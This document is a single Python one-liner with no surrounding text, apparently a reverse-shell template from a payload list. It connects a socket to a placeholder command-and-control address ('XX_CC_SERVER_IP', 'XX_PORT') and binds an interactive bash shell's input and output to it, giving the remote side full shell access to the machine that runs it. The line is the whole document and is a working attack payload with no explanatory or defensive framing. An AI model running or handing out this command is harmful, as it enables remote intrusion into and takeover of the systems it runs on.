python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("XX_CC_SERVER_IP",XX_PORT));subprocess.call(["/bin/bash","-i"],stdin=s,stdout=s,stderr=s)'
